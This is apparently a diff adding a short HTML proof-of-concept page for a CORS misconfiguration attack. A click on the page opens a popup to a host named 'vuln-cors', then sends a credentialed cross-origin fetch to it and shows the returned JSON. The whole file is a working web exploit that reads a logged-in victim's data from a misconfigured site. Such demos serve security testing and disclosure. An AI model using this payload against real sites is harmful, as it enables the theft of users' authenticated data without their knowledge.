@@ -1,0 +1,27 @@
+<body>
+  <p>Click anywhere on this page to trigger the CORS request.</p>
+  <div id="response"></div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      document.onclick = () => {
+        open('https://vuln-cors.nicksv.com/button.html');
+
+        setTimeout(() => {
+          fetch('https://vuln-cors.nicksv.com/', {
+            method: 'GET',
+            credentials: 'include',
+            mode: 'cors'
+          })
+            .then(response => response.json())
+            .then(data => {
+              document.getElementById('response').innerHTML = JSON.stringify(data, null, 2);
+            })
+            .catch(error => {
+              console.log('Failed to issue CORS request');
+            });
+        }, 3000);
+      }
+    });
+  </script>
+</body>
